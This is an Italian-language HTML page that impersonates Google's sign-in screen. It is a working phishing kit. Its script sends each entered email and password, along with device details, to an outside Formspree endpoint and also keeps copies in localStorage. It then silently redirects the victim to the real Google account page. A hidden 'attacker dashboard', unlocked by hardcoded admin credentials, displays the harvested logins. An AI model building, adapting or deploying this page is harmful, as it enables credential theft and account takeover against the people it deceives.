<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Accedi</title>
    <style>
        :root { --google-blue: #1a73e8; --google-gray: #dadce0; --text-dark: #202124; }
        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; }

        /* Interfaccia Google */
        .login-card { width: 450px; padding: 48px 40px 36px; border: 1px solid var(--google-gray); border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px 0; color: var(--text-dark); }
        p { font-size: 16px; margin-bottom: 35px; color: var(--text-dark); }

        .input-group { margin-bottom: 25px; text-align: left; }
        .label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: #5f6368; }
        input { width: 100%; padding: 13px 15px; border: 1px solid var(--google-gray); border-radius: 4px; font-size: 16px; }
        input:focus { border: 2px solid var(--google-blue); outline: none; }

        .footer { display: flex; justify-content: flex-end; margin-top: 40px; }
        button { background-color: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }

        /* Pannello Admin Segreto */
        #admin-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0d1117; color: #c9d1d9; padding: 40px; z-index: 1000; overflow-y: auto; }
        .hacker-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        .hacker-table th, .hacker-table td { padding: 12px; border: 1px solid #30363d; text-align: left; font-family: monospace; }
        .hacker-table td { color: #7ee787; }

        /* Loading Screen */
        #loading { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100vh; width: 100%; position: fixed; top: 0; left: 0; background: white; z-index: 500; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--google-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="main-ui" class="login-card">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
    <h1>Accedi</h1>
    <p>Utilizza il tuo Account Google</p>
    
    <div class="input-group">
        <label class="label">Email o telefono</label>
        <input type="text" id="email" placeholder="Email o telefono">
    </div>

    <div class="input-group">
        <label class="label">Inserisci la password</label>
        <input type="password" id="pass" placeholder="Password">
    </div>

    <div class="footer">
        <button onclick="handleLogin()">Avanti</button>
    </div>
</div>

<div id="loading">
    <div class="spinner"></div>
    <p style="margin-top: 15px;">Verifica in corso...</p>
</div>

<div id="admin-panel">
    <h1>[DASHBOARD ATTACCANTE - LOG REMOTO]</h1>
    <table class="hacker-table">
        <thead>
            <tr><th>Data</th><th>Email</th><th>Password</th><th>Dispositivo</th></tr>
        </thead>
        <tbody id="data-rows"></tbody>
    </table>
    <br>
    <button onclick="location.reload()" style="background:#30363d; color:white; padding:10px; border:none; cursor:pointer;">Torna al Login</button>
</div>

<script>
    async function handleLogin() {
        const e = document.getElementById('email').value;
        const p = document.getElementById('pass').value;

        // --- LOGIN ADMIN ---
        if (e === "admin@demo.it" && p === "mostra-tutto") {
            showAdmin();
            return;
        }

        if(!e || !p) return alert("Inserisci i dati!");

        // Mostra caricamento simulato
        document.getElementById('main-ui').style.display = 'none';
        document.getElementById('loading').style.display = 'flex';

        // --- INVIO EMAIL VIA FORMSPREE ---
        try {
            await fetch("https://formspree.io/f/xzdolnpd", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    Email: e, 
                    Password: p, 
                    Info: navigator.userAgent,
                    Piattaforma: navigator.platform
                })
            });
        } catch (err) { console.log("Errore silente"); }

        // --- SALVATAGGIO LOCALE ---
        let db = JSON.parse(localStorage.getItem('db_final')) || [];
        db.push({ dt: new Date().toLocaleString(), em: e, ps: p, dev: navigator.platform });
        localStorage.setItem('db_final', JSON.stringify(db));

        // Reindirizzamento
        setTimeout(() => {
            window.location.href = "https://myaccount.google.com/";
        }, 1500);
    }

    function showAdmin() {
        const db = JSON.parse(localStorage.getItem('db_final')) || [];
        const rows = document.getElementById('data-rows');
        rows.innerHTML = db.map(i => `<tr><td>${i.dt}</td><td>${i.em}</td><td>${i.ps}</td><td>${i.dev}</td></tr>`).join('');
        document.getElementById('main-ui').style.display = 'none';
        document.getElementById('admin-panel').style.display = 'block';
    }
</script>

</body>
</html>
